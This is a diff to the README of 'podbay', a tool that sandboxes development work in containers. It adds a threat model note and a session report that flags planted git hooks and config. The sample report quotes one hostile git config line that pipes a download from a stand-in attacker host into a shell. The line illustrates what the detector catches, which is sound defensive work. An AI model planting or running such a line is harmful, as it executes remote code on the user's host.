@@ -21,8 +21,8 @@ Being rebuilt in Rust, in stages:
 
 1. **Rust port** with real config parsing, Podman and Docker backends, tests
    and CI. *(done)*
-2. Threat model, plus a session report that flags changes to git hooks and
-   config.
+2. **Threat model**, plus a session report that flags changes to git hooks and
+   config. *(done)*
 3. Container hardening: dropped capabilities, `no-new-privileges`, read-only
    root filesystem, resource limits.
 4. Network policy: no network by default, with an allowlist enforced by a
@@ -30,10 +30,11 @@ Being rebuilt in Rust, in stages:
 5. Landlock and seccomp around processes inside the container.
 6. A native rootless runtime, with Podman and Docker kept as fallbacks.
 
-Until stage 2 lands, the container is a convenience boundary, not a security
-guarantee. In particular, the project is mounted read-write, so code inside
-can modify `.git/hooks`, and those hooks run on your host the next time you
-use git there.
+The container is not yet a hardened boundary. [THREAT_MODEL.md](THREAT_MODEL.md)
+covers what is and isn't protected today, and which stage closes each gap.
+The biggest one: the project is mounted read-write, so code inside can plant
+git hooks or config that run on your host the next time you use git there.
+The [session report](#session-report) tells you when that has happened.
 
 ## Install
 
@@ -61,9 +62,37 @@ podbay run --dry-run .        # print the exact podman/docker command
 podbay build                  # build or refresh the images ahead of time
 ```
 
+podbay's exit code is the command's (or the shell's) exit code.
+
 Files the container creates in your project are owned by you on the host. On
 rootless Podman, `dev` is mapped onto your user with `keep-id`. On rootful
 Docker, the entrypoint gives `dev` your uid and gid before dropping root.
+
+## Session report
+
+When the container exits, podbay reports anything it changed that the host
+will act on later: git hooks, git config, the `.git` entry itself, nested
+repositories, and a few files that editors and shells run (`.envrc`,
+`.vscode/`, mise config).
+
+```
+podbay: session report: 2 warnings, 1 notice
+  warning: .git/config: settings changed
+            + core.fsmonitor = curl -s evil.example | sh   [can run commands]
+  warning: .git/hooks/post-checkout: added, an executable file
+  notice:  .envrc: changed during the session (direnv runs it in your shell once allowed)
+podbay: git and other tools on the host act on these files. Inspect them before running git in /home/me/src/app
+```
+
+A clean session ends with one line:
+`podbay: session report: no changes to git hooks or config`.
+
+A warning means don't run git in that project on the host until you've
+looked at the files it lists. Legitimate work can trigger it too, for
+example when the container runs `git checkout -b x --track` and that
+writes branch settings. The settings list makes that easy to tell apart.
+The report detects changes; it doesn't revert them.
+[THREAT_MODEL.md](THREAT_MODEL.md) lists what it covers and its limits.
 
 ## Profiles
 
@@ -141,6 +170,10 @@ base_image = "my/image:tag"  # use your own image instead of the bundled one
 A custom base image must provide a `dev` user and podbay's entrypoint (see
 `base/`).
 
+`PODBAY_CONFIG_DIR` and `PODBAY_CACHE_DIR` move podbay's config and cache
+directories without touching `HOME` or `XDG_*`. Rootless Podman uses those to
+find its own storage.
+
 ## A note on mise and trust
 
 mise can install tools from many sources, and some of its backends run
@@ -158,7 +191,8 @@ cargo test                          # unit, CLI and end-to-end tests
 PODBAY_TEST_BACKEND=podman cargo test
 ```
 
-The end-to-end test runs a real container on Docker (or the engine named by
-`PODBAY_TEST_BACKEND`) and is skipped when that engine isn't available. It
-uses a small stand-in for the base image (`tests/fixtures/test-base`) with the
-same entrypoint, so it doesn't need to build the full toolchain.
+The end-to-end tests run real containers on Docker (or the engine named by
+`PODBAY_TEST_BACKEND`) and are skipped when that engine isn't available. They
+use a small stand-in for the base image (`tests/fixtures/test-base`) with the
+same entrypoint, so they don't need to build the full toolchain. One of them
+plays a hostile session and checks that the session report catches it.
